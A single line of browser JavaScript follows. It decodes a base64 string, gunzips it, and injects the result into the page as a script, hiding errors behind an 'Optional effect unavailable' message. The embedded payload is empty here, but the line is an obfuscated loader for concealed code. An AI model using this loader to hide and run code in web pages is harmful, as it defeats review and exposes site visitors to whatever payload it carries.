(async()=>{try{const b=Uint8Array.from(atob(''),c=>c.charCodeAt(0));const t=await new Response(new Blob([b]).stream().pipeThrough(new DecompressionStream('gzip'))).text();const u=URL.createObjectURL(new Blob([t],{type:'text/javascript'}));const s=document.createElement('script');s.src=u;s.onload=()=>URL.revokeObjectURL(u);document.body.appendChild(s);}catch(e){console.info('Optional effect unavailable',e);}})();
